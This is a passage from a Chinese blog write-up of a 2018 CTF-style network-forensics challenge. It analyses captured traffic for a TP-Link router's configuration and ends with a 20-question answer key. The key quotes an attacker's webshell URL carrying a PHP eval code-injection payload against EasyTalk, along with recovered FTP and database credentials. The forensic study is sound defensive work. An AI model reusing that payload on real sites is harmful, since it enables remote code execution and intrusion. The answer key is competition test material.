+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/16.png" srcset="/img/loading.gif" alt="16"></p>
+<p>可以看到在这里登录成功了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;id&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">&quot;result&quot;</span>:&#123; <span class="hljs-attr">&quot;locale&quot;</span>:<span class="hljs-string">&quot;zh_CN&quot;</span>, <span class="hljs-attr">&quot;force&quot;</span>:<span class="hljs-literal">false</span>, <span class="hljs-attr">&quot;radio&quot;</span>:<span class="hljs-number">2</span>, <span class="hljs-attr">&quot;model&quot;</span>:<span class="hljs-string">&quot;TL-WAR1300L v1.0&quot;</span> &#125;, <span class="hljs-attr">&quot;error_code&quot;</span>:<span class="hljs-string">&quot;0&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
+<p>从返回的<code>json</code>数据中，可以获得路由器的<code>model</code>值是<code>TL-WAR1300L v1.0</code></p>
+<p>后面又问了路由器的所有<code>IP</code>地址,在他的<code>Web</code>管理界面应该可以找到。<br>继续往下翻</p>
+<p>从请求来看，这个路由器管理界面通过<code>JS</code>来实现的动态页面，使用<code>json</code>来作为与服务器之间的信息传输格式。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">No</span>.<span class="hljs-number">433619</span><br><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">1812</span><br><span class="hljs-attribute">lan</span>.js<br><br><span class="hljs-attribute">No</span>.<span class="hljs-number">435490</span><br><span class="hljs-attribute">setting</span>.js<br><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">1843</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">No.<span class="hljs-number">482107</span><br>POST <span class="hljs-regexp">/webpages/</span>data<span class="hljs-regexp">/advanced.menu.json HTTP/</span><span class="hljs-number">1.1</span>\r\n<br></code></pre></td></tr></table></figure>
+<p><code>No.483716</code></p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/17.png" srcset="/img/loading.gif" alt="17"></p>
+<p>追踪一下，查看一下返回的<code>json</code>数据</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>​    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <br>​    <span class="hljs-string">&quot;result&quot;</span>: &#123;<br>​        <span class="hljs-string">&quot;normal&quot;</span>: [<br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;202.1.1.1&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;connect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;WAN1&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.12.173&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;internet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;WAN2&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;dhcp&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.0.1&quot;</span>, <br>​                <span class="hljs-string">&quot;dhcp_status&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;LAN1&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;connect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">true</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.0.1&quot;</span>, <br>​                <span class="hljs-string">&quot;dhcp_status&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;LAN2&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;connect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;, <br>​            &#123;<br>​                <span class="hljs-string">&quot;py_isup&quot;</span>: <span class="hljs-literal">false</span>, <br>​                <span class="hljs-string">&quot;ipaddr&quot;</span>: <span class="hljs-string">&quot;192.168.0.1&quot;</span>, <br>​                <span class="hljs-string">&quot;dhcp_status&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​                <span class="hljs-string">&quot;t_type&quot;</span>: <span class="hljs-string">&quot;ethernet&quot;</span>, <br>​                <span class="hljs-string">&quot;t_name&quot;</span>: <span class="hljs-string">&quot;LAN3&quot;</span>, <br>​                <span class="hljs-string">&quot;t_isup&quot;</span>: <span class="hljs-string">&quot;disconnect&quot;</span>, <br>​                <span class="hljs-string">&quot;t_linktype&quot;</span>: <span class="hljs-string">&quot;static&quot;</span><br>​            &#125;<br>​        ]<br>​    &#125;, <br>​    <span class="hljs-string">&quot;error_code&quot;</span>: <span class="hljs-string">&quot;0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可知路由器的<code>WAN1`` WAN2`` LAN1`` LAN2 </code>已经连接<br>IP地址分别为</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">202.1.1.1</span><br><span class="hljs-number">192.168.12.173</span><br><span class="hljs-number">192.168.0.1</span><br></code></pre></td></tr></table></figure>
+<p>再往下</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/18.png" srcset="/img/loading.gif" alt="18"></p>
+<p>在<code>lan.js</code>中可以查到<br>涉及端口监控的都携带有<code>MONITOR</code></p>
+<p>经过查找可知在<code>advanced.menu.json</code>中有<br><code>port-monitor</code>这一项</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/19.png" srcset="/img/loading.gif" alt="19"></p>
+<p>路由器拥有五个接口</p>
+<p>再看第17题,一般来说，路由器的端口监控，就是端口镜像，将多个端口的流量转发到一个端口上来实现对流量的监控</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/20.png" srcset="/img/loading.gif" alt="20"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;id&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">&quot;result&quot;</span>:&#123; <span class="hljs-attr">&quot;state&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>, <span class="hljs-attr">&quot;mode&quot;</span>:<span class="hljs-string">&quot;both&quot;</span>, <span class="hljs-attr">&quot;mirroredports&quot;</span>:[ <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span> ], <span class="hljs-attr">&quot;mirrorport&quot;</span>:<span class="hljs-string">&quot;3&quot;</span> &#125;, <span class="hljs-attr">&quot;error_code&quot;</span>:<span class="hljs-string">&quot;0&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
+<p>可知3号端口是1号和2号的镜像，也就是<code>3-&gt;1,2</code></p>
+<p>接下来要找系统路由表</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;route&quot;</span>  <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>根据URL猜测为最后一条.</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/21.png" srcset="/img/loading.gif" alt="21"></p>
+<p>追踪一下<code>TCP</code>流</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>​    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <br>​    <span class="hljs-string">&quot;result&quot;</span>: [<br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;192.168.12.254&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;WAN2&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;127.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;lo&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.255.252.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;192.168.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;LAN&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.255.255.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;192.168.12.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;WAN2&quot;</span><br>​        &#125;, <br>​        &#123;<br>​            <span class="hljs-string">&quot;metric&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <br>​            <span class="hljs-string">&quot;gateway&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <br>​            <span class="hljs-string">&quot;mask&quot;</span>: <span class="hljs-string">&quot;255.255.255.0&quot;</span>, <br>​            <span class="hljs-string">&quot;dest&quot;</span>: <span class="hljs-string">&quot;202.1.1.0&quot;</span>, <br>​            <span class="hljs-string">&quot;interface&quot;</span>: <span class="hljs-string">&quot;WAN1&quot;</span><br>​        &#125;<br>​    ], <br>​    <span class="hljs-string">&quot;error_code&quot;</span>: <span class="hljs-string">&quot;0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可知第三条的子网掩码是<code>255.255.252.0</code></p>
+<p>然后要找<code>5Gwifi</code>..</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;5G&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/22.png" srcset="/img/loading.gif" alt="22"></p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<br>​    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <br>​    <span class="hljs-string">&quot;result&quot;</span>: &#123;<br>​        <span class="hljs-string">&quot;0&quot;</span>: &#123;<br>​            <span class="hljs-string">&quot;mssid&quot;</span>: [<br>​                <span class="hljs-string">&quot;test-ge1&quot;</span><br>​            ], <br>​            <span class="hljs-string">&quot;wds&quot;</span>: <span class="hljs-string">&quot;off&quot;</span>, <br>​            <span class="hljs-string">&quot;channel&quot;</span>: <span class="hljs-number">1</span>, <br>​            <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;11bgn mixed&quot;</span>, <br>​            <span class="hljs-string">&quot;radio_enable&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​            <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">1</span>, <br>​            <span class="hljs-string">&quot;frequency&quot;</span>: <span class="hljs-string">&quot;2.4G&quot;</span><br>​        &#125;, <br>​        <span class="hljs-string">&quot;1&quot;</span>: &#123;<br>​            <span class="hljs-string">&quot;mssid&quot;</span>: [<br>​                <span class="hljs-string">&quot;test-ge1&quot;</span><br>​            ], <br>​            <span class="hljs-string">&quot;wds&quot;</span>: <span class="hljs-string">&quot;off&quot;</span>, <br>​            <span class="hljs-string">&quot;channel&quot;</span>: <span class="hljs-number">36</span>, <br>​            <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;11anac mixed&quot;</span>, <br>​            <span class="hljs-string">&quot;radio_enable&quot;</span>: <span class="hljs-string">&quot;on&quot;</span>, <br>​            <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>, <br>​            <span class="hljs-string">&quot;frequency&quot;</span>: <span class="hljs-string">&quot;5G&quot;</span><br>​        &#125;, <br>​        <span class="hljs-string">&quot;2&quot;</span>: &#123;<br>​            <span class="hljs-string">&quot;mssid&quot;</span>: [<br>​                <span class="hljs-string">&quot;TP-LINK_GUEST_6258&quot;</span><br>​            ], <br>​            <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>, <br>​            <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;11bgn mixed&quot;</span>, <br>​            <span class="hljs-string">&quot;radio_enable&quot;</span>: <span class="hljs-string">&quot;off&quot;</span>, <br>​            <span class="hljs-string">&quot;frequency&quot;</span>: <span class="hljs-string">&quot;visitor&quot;</span><br>​        &#125;<br>​    &#125;, <br>​    <span class="hljs-string">&quot;error_code&quot;</span>: <span class="hljs-string">&quot;0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>所以最后一题答案为<code>test-ge136</code></p>
+<h2 id="4-最后答案"><a href="#4-最后答案" class="headerlink" title="4. 最后答案"></a>4. 最后答案</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.黑客的IP是多少<br><span class="hljs-number">202.1</span>.<span class="hljs-number">1.2</span><br><span class="hljs-number">2</span>.服务器<span class="hljs-number">1.99</span>的web服务器使用的CMS及其版本号(请直接复制)<br>EasyTalk X2.<span class="hljs-number">0.1</span><br><span class="hljs-number">3</span>.服务器拿到的webshell的网址(请输入url解码后的网址)<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">202.1</span>.<span class="hljs-number">1.1</span><span class="hljs-regexp">/index.php/m</span>odule<span class="hljs-regexp">/action/</span>param1/<span class="hljs-variable">$&#123;@print(eval($_POST[c]))&#125;</span><br><span class="hljs-number">4</span>.服务器<span class="hljs-number">1.99</span>的主机名<br>simplefight1<br><span class="hljs-number">5</span>.网站根目录的绝对路径(注意最后加斜杠)<br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>easytalk/<br><span class="hljs-number">6</span>.黑客上传的第一个文件名称是什么<br>scan.php<br><span class="hljs-number">7</span>.黑客进行内网扫描，扫描的端口都有哪些(端口从小到大，用英文逗号分隔)<br><span class="hljs-number">21</span>,<span class="hljs-number">80</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">3306</span><br><span class="hljs-number">8</span>.服务器<span class="hljs-number">2.88</span>的ftp服务账号密码(格式：账号/密码)<br>administrator/<span class="hljs-number">123456</span><br><span class="hljs-number">9</span>.黑客成功登陆ftp的时间(格式：<span class="hljs-number">10</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span>)<br><span class="hljs-number">14</span>:<span class="hljs-number">07</span>:<span class="hljs-number">15</span><br><span class="hljs-number">10</span>.黑客在ftp中下载的敏感文件名称是什么<br>config_db.php<br><span class="hljs-number">11</span>.服务器<span class="hljs-number">2.88</span>中用户名为admin_zz的web后台管理员的密码<br><span class="hljs-number">1</span>q2w3e4r<br><span class="hljs-number">12</span>.服务器<span class="hljs-number">2.88</span>的mysql账号密码(格式：账号/密码)<br>localhost/S1mp13zz<br><span class="hljs-number">13</span>.服务器<span class="hljs-number">2.88</span>的mysql服务中有和admin有关的三个表，请按照黑客的查询顺序作答，使用空格分隔<br>met_admin_array,met_admin_column,met_admin_table<br><span class="hljs-number">14</span>.请列出黑客设置的genreal log的绝对路径(将路径复制出来，区分大小写)<br>c:<span class="hljs-regexp">/phpStudy/</span>WWW<span class="hljs-regexp">/config/</span>config.php<br><span class="hljs-number">15</span>.路由器的品牌、型号、版本(请直接复制粘贴)<br>TL-WAR1300L v1.<span class="hljs-number">0</span><br><span class="hljs-number">16</span>.列出路由器的所有IP地址(格式：从小到大，用英文逗号分隔)<br><span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>,<span class="hljs-number">192.168</span>.<span class="hljs-number">12.173</span>,<span class="hljs-number">202.1</span>.<span class="hljs-number">1.1</span><br><span class="hljs-number">17</span>.在路由器的端口监控中，监控端口和被监控端口分别是多少，例，<span class="hljs-number">1</span>号端口监控<span class="hljs-number">2</span><span class="hljs-regexp">/3/</span><span class="hljs-number">4</span>号端口:<span class="hljs-number">1</span>—&gt;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><span class="hljs-number">3</span>-&gt;<span class="hljs-number">1</span>,<span class="hljs-number">2</span><br><span class="hljs-number">18</span>.路由器一共有几个接口?其中有几个WAN口启用?有几个LAN口启用(格式:用英文逗号分隔)<br><span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span><br><span class="hljs-number">19</span>.路由器的系统路由表中一共有几条?第三条的子网掩码是多少。例: <span class="hljs-number">255</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">0</span>则为<span class="hljs-number">24</span> (格式:用英文逗号分隔)<br><span class="hljs-number">255.255</span>.<span class="hljs-number">252.0</span><br><span class="hljs-number">20</span>.路由器的<span class="hljs-number">5</span>Gwif名称是什么，信道是多少(格式:名称信道)<br>test-ge136<br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/">数据包分析</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/01/28/phpbrew-nginx%E6%89%93%E9%80%A0%E5%A4%9A%E7%89%88%E6%9C%ACphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">phpbrew+nginx打造多版本php开发环境</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/12/03/2018-5-5-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">2018.5.5-铁人三项赛数据赛数据包分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
